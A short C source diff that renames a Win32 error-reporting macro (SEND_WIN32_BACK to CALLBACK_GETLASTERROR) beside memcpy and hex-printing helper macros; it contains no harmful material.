@@ -41,7 +41,7 @@
 #endif
 
 #define MemCopy                         __builtin_memcpy
-#define SEND_WIN32_BACK                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+#define CALLBACK_GETLASTERROR                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
 
 #define PRINT_HEX( b, l )                               \
     printf( #b ": [%d] [ ", l );                        \
